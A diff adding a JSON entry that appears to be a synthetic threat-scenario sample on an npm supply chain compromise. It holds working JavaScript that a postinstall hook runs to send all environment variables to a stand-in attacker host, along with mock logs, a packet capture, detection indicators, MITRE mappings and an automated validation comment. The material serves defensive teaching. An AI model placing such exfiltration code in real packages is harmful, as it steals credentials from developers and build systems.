@@ -1,0 +1,41 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Supply Chain",
+        "nature": "supply chain compromise"
+      },
+      "example": {
+        "scenario": "Malicious code injected into a popular NPM package that exfiltrates environment variables and secrets during CI/CD pipeline execution, leading to credential compromise in enterprise environments.",
+        "technical_data": {
+          "npm_package_malicious_code": "index.js\n\nmodule.exports = function() {\n    const https = require('https');\n    const os = require('os');\n    const env = process.env;\n\n    // Exfiltrate environment variables to attacker-controlled server\n    const data = JSON.stringify({hostname: os.hostname(), env: env});\n\n    const options = {\n        hostname: 'malicious-collector.example.com',\n        port: 443,\n        path: '/collect',\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application/json',\n            'Content-Length': data.length\n        }\n    };\n\n    const req = https.request(options, (res) => {\n        // no-op\n    });\n\n    req.on('error', (e) => {\n        // suppress errors\n    });\n\n    req.write(data);\n    req.end();\n};",
+          "npm_package_metadata": "{\n  \"name\": \"lib-utils\",\n  \"version\": \"2.3.4\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"postinstall\": \"node index.js\"\n  }\n}",
+          "CI_pipeline_log_snippet": "[2024-04-12T15:23:01Z] INFO: Installing dependencies\n[2024-04-12T15:23:07Z] INFO: Running postinstall script for lib-utils@2.3.4\n[2024-04-12T15:23:07Z] INFO: POST /collect HTTP/1.1\nHost: malicious-collector.example.com\nContent-Type: application/json\nContent-Length: 512\n\n{\"hostname\":\"ci-runner-07\",\"env\":{\"AWS_ACCESS_KEY_ID\":\"AKIA...\",\"AWS_SECRET_ACCESS_KEY\":\"...\",\"GITHUB_TOKEN\":\"ghp_...\"}}",
+          "network_packet_capture_text": "FRAME 1234: 512 bytes on wire (4096 bits), 512 bytes captured (4096 bits)\nEthernet II, Src: 02:42:ac:11:00:02, Dst: 00:1a:2b:3c:4d:5e\nInternet Protocol Version 4, Src: 172.17.0.2, Dst: 198.51.100.25\nTransmission Control Protocol, Src Port: 49222, Dst Port: 443, Seq: 1, Ack: 1, Len: 512\nSecure Sockets Layer\nTLSv1.2 Record Layer: Application Data\n\nHTTP Request:\nPOST /collect HTTP/1.1\r\nHost: malicious-collector.example.com\r\nUser-Agent: nodejs/14.17\r\nContent-Type: application/json\r\nContent-Length: 512\r\n\r\n{\"hostname\":\"ci-runner-07\",\"env\":{\"AWS_ACCESS_KEY_ID\":\"AKIA...\",\"AWS_SECRET_ACCESS_KEY\":\"...\",\"GITHUB_TOKEN\":\"ghp_...\"}}",
+          "enterprise_server_logs": "Apr 12 15:23:07 ci-runner-07 npm[23456]: > lib-utils@2.3.4 postinstall /build/node_modules/lib-utils\nApr 12 15:23:07 ci-runner-07 npm[23456]: > node index.js\nApr 12 15:23:07 ci-runner-07 node:info: Sending environment data to https://malicious-collector.example.com/collect\nApr 12 15:23:07 ci-runner-07 curl[23460]: POST /collect 200 512 - 0.123 ms",
+          "git_commit_diff": "--- a/package.json\n+++ b/package.json\n@@ -10,6 +10,10 @@\n+  \"scripts\": {\n+    \"postinstall\": \"node index.js\"\n+  },\n+  \"main\": \"index.js\",\n "
+        },
+        "indicators": [
+          "NPM package version 2.3.4 of 'lib-utils' includes unexpected 'postinstall' script",
+          "Outbound HTTPS POSTs from CI runners to suspicious domain malicious-collector.example.com",
+          "High entropy JSON payloads containing environment variables in network logs",
+          "Unexpected process spawn of 'node index.js' during dependency installation",
+          "Presence of suspicious domain malicious-collector.example.com in DNS logs"
+        ],
+        "detection_method": "Monitor CI/CD pipeline logs for unexpected postinstall or lifecycle script executions in dependencies. Use software composition analysis (SCA) to verify integrity and provenance of dependencies. Network monitoring for anomalous HTTPS POST traffic to unknown external endpoints from build servers. Implement runtime behavior analysis to detect outbound exfiltration attempts from build agents.",
+        "relevant_mitre_techniques": [
+          "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1552.001 - Credentials in Files",
+          "T1609 - Container and Resource Discovery (if containerized CI/CD)"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a supply chain compromise scenario involving malicious code injection into a widely used open-source NPM package. The scenario description aligns well with the problem nature, describing exfiltration of environment variables and secrets during CI/CD pipeline execution, which can lead to widespread credential compromise in enterprise environments. The technical data is comprehensive and realistic, including malicious code, package metadata, CI pipeline logs, network captures, server logs, and git diffs that collectively demonstrate the compromise and its propagation. The indicators clearly highlight suspicious behaviors and artifacts that support detection and validation of the compromise. The detection methods align with the recommended risk reduction strategies, emphasizing monitoring of CI/CD pipelines, software composition analysis, and network/runtime behavior monitoring. The inclusion of relevant MITRE ATT&CK techniques further strengthens the sample's completeness and realism. Overall, the sample is well-constructed, plausible, and complete, effectively illustrating the stated cybersecurity problem."
+      }
+    }
+  ]
+}
